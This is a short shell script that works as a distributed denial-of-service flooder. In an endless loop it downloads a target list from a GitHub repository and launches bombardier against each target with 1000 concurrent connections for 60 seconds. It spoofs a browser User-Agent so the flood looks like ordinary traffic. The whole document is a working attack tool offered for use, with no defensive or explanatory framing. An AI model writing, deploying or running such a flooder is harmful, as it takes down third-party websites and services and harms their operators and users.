#!/bin/sh 

while true
do
    wget -O /app/targets.txt https://github.com/Anarhyst266/flood/blob/168c2598a51324ae61b50682858b3e9a4f6ff888/targets.txt 
    cat /app/targets.txt | while read line
    do
        bombardier -c 1000 -d 60s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" -q ${line} &
    done
    sleep 60
done
